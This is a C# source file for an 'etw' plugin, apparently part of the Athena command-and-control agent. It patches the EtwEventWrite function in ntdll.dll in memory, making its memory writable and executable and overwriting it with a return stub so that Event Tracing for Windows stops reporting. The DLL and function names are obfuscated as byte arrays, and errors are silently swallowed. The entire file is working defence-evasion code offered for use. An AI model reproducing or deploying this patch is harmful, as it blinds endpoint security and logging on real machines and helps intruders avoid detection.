using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugins
{
    class wShield
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    public class Etw : AthenaPlugin
    {
        public override string Name => "etw";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                if (Environment.Is64BitProcess)
                {
                    if (SpearAndShield(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }))
                    {

                    }
                }
                else
                {
                    if (SpearAndShield(new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 }))
                    {

                    }
                }

            }
            catch (Exception e)
            {
                //oh no an error

            }
        }
        private bool SpearAndShield(byte[] bSpear)
        {
            try
            {
                uint uCape;
                byte[] bSword = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
                var pShield = wShield.LoadLibrary(Encoding.ASCII.GetString(bSword));

                byte[] bShield = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
                var pMail = wShield.GetProcAddress(pShield, Encoding.ASCII.GetString(bShield));

                wShield.VirtualProtect(pMail, (UIntPtr)bSpear.Length, 0x40, out uCape);
                Marshal.Copy(bSpear, 0, pMail, bSpear.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
